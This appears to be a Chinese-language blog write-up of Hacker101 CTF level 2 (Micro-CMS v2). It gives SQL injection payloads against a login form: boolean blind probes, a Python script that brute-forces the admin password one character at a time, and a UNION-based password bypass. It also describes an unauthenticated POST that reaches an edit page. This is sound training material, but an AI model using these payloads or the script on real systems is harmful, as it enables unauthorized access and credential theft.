---
title: "hacer101 第2关&&第3关"
date: 2019-10-15T10:42:39+08:00
showDate: true
draft: false
tags: ["security","hacker101", "ctf"]
categories: ["security"]
---

### 第2关 Micro-CMS v2

#### flag 1 

这一关一进来就说这是一个之前CMS的升级版本，修复的之前的安全问题，现在edit需要账号密码登录了，看起来是考sql注入吧。
试了试用户名框输入`'`提交，直接报错

```python

Traceback (most recent call last):
  File "./main.py", line 145, in do_login
    if cur.execute('SELECT password FROM admins WHERE username=\'%s\'' % request.form['username'].replace('%', '%%')) == 0:
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/cursors.py", line 255, in execute
    self.errorhandler(self, exc, value)
  File "/usr/local/lib/python2.7/site-packages/MySQLdb/connections.py", line 50, in defaulterrorhandler
    raise errorvalue
ProgrammingError: (1064, "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1")

```

从这里大概能看出一些信息比如执行的sql语句是

```sql

SELECT password FROM admins WHERE username='';
```

应该是查用户名的密码然后跟提交的比对，然后数据库是mariadb, 表名是admins

接着试

```sql

' or 1 = 1 #
```

然后提示是invalid passsword， 看起来是username被跳过但是密码因为为空所以错误了。

继续尝试

```sql

' or 1 = 1 and 1 > (select count(*) from admins) #
```

返回了unkonwn user， 说明` 1 > (select count(*) from admins) `为`false`，所以admins表里面只有不多于一条数据，接下来用length猜字段长度

```sql

' or 1 = 1 and 1 > (select count(*) from admins where length(username) = 6) #
' or 1 = 1 and 1 > (select count(*) from admins where length(password) = 6) #
```

说明username和password长度都是6

然后是猜每个位置的字母

```sql

' or 1 = 1 and 1 >  (select count(*) from admins where left(username, 1) = 'a')#
```

手动尝试的话也要几百次，于是尝试下用python写个脚本，核心代码如下，功能为检测某个位置的字母是什么

```python

def get_username_word(idx, a):
    '''

    :param idx: 位置
    :param a: 字母
    :return:
    '''
    url = "http://35.227.24.107/ff1706e3ac/login"
    username = "' or 1 = 1 and 1 >  (select count(*) from admins where left(password, {}) = '{}')#".format(idx, a)
    # username = "mollie"
    # password = "jeanne"
    password = ""

    data = {
        "username": username,
        "password": ""
    }
    r = requests.post(url, data=data)
    if not re.search('Invalid password', r.text):
        print(idx, "is", a)
        return True
    else:
        print(idx, "is not", a)
    return False
```

最后跑出结果

```

    # username = "mollie"
    # password = "jeanne"
```

登陆后拿到flag

![2-1](2-1.png)

#### flag 2

拿到第一个flag之后，找了好久，发现目前可访问的url只有

```

/home       200
/page/1     200
/page/2     200
/page/3     401
/login      200
```

里面也没什么重要的信息，然后尝试访问第一个版本存在的`/page/edit/1`，发现直接重定向到了`/login`，login之后也就只有一个flag并没有后续信息，我尝试把flag当cookie访问`/page/edit/1`,结果还是重定向。

![2-2](2-2.png)

好像卡住了，突然没有了方向。再看了一眼第1关的CMS，它好像有个`POST /page/edit/1`，于是我试了一下POST，果然第二个flag在这。

![2-3](2-3.png)


#### flag 3

找完前两个flag又卡住了，好像现在该找的地方都找了一遍。于是就这样卡了一天，没什么头绪。最后看了两个hint

```

Regular users can only see public pages
Getting admin access might require a more perfect union
```

第一个hint显然说的是`/page/3`这个403的页面，第二个我看到了union，我猜还是在登录界面用注入的方法拿到flag。因为对sql不是很熟悉，所以我仔细查看了一下union的用法，然后在自己的数据库尝试了一下

```

描述
MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。多个 SELECT 语句会删除重复的数据。

语法
MySQL UNION 操作符语法格式：

SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions]
UNION [ALL | DISTINCT]
SELECT expression1, expression2, ... expression_n
FROM tables
[WHERE conditions];
```

```sql

SELECT username FROM user 
WHERE username=''
UNION
SELECT 1
```

结果返回为

|username|
|-----|
|1|

这下有了头绪，hint大概是想让我们跳过密码实现登录。回头看一眼他的SQL，

```sql

SELECT password FROM admins WHERE username='';
```

把password查出来然后和post过去的比对，那我只要把他改造成下面这种，查出来的结果和我提交的密码就可以了。

```sql

SELECT password FROM admins
WHERE username=''
UNION
SELECT 1
```

然后提交表单里面填`username=' union select 1#&password=1`就能免密码登录了。试了一下，果然成功了。登录之后就可以访问`/page/3`了。最后一个flag也就在这里。

![2-4](2-4.png)

### 第3关 Encrypted Pastebin


#### 加密这块不是很了解，先放着

